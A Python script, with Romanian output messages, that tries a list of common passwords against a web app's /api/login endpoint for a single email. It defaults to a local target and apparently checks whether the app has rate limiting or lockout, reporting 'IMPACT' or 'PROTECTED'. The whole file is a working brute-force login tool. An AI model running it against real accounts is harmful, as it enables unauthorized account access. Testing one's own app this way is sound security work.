import argparse
import requests
import time


COMMON_PASSWORDS = [
    "123456", "password", "12345678", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine",
    "michael", "shadow", "123123", "654321", "admin123",
    "admin", "root", "toor", "pass", "test",
]

def brute_force(target_url, email, passwords):
    for i, pwd in enumerate(passwords, 1):
        try:
            res = requests.post(
                f"{target_url}/api/login",
                json={"email": email, "password": pwd},
                timeout=10
            )
            status = res.status_code
            data = res.json()

            if status == 200:
                print(f"Tentativa #{i} a functionat")
                print(f"Parola: {pwd}")
                print(f"Raspuns: {data}")
                return pwd
            elif status == 429:
                print(f"Blocat la #{i} de Rate Limit")
                return None
            elif status == 401:
                print(f"Tentativa #{i} nu a mers cu parola {pwd} ( {data.get('error', "Esuat")} )")
            elif status == 404:
                print(f"Utilizatorul {email} nu exista")
                return None
            elif status == 403:
                print(f"Cont blocat ( {data.get('error', "")} )")
        except requests.exceptions.RequestException as e:
            print(f"Eroare")
            return None 

    print("Nicio parola gasita")
    return None



parser = argparse.ArgumentParser(description="Brute Force")
parser.add_argument("--target", default="http://localhost:5000")
parser.add_argument("--email", default="admin@test.ro")
args = parser.parse_args()
passwords = COMMON_PASSWORDS

start = time.time()
result = brute_force(args.target, args.email, passwords)
elapsed = time.time() - start


print()
if result:
    print(f"Parola '{result}' a fost găsită în {elapsed:.1f}s")
    print("IMPACT: Un atacator poate obține acces la cont prin brute force.")
else:
    print(f"PROTEJAT: Atacul nu a reușit în {elapsed:.1f}s")
print(f"{'=' * 50}")   
            